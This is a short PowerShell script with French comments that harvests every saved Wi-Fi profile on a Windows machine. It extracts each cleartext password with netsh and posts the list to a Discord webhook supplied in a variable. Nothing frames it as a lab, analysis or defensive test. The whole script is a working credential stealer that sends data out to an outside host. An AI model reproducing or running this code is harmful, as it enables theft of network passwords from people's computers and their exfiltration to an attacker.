# Récupération des informations Wi-Fi
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name=$_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
        $pass=$_.Matches.Groups[1].Value.Trim()
        "$name : $pass"
    }
}

# Envoi des informations à Discord
function Upload-Discord {
    param (
        [string]$webhook,
        [string]$message
    )

    $Body = @{
      'content' = $message
    }

    Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
}

# Envoi des informations à Discord
if (-not ([string]::IsNullOrEmpty($dc))){
    Upload-Discord -webhook $dc -message ($wifiProfiles -join "`n")
}
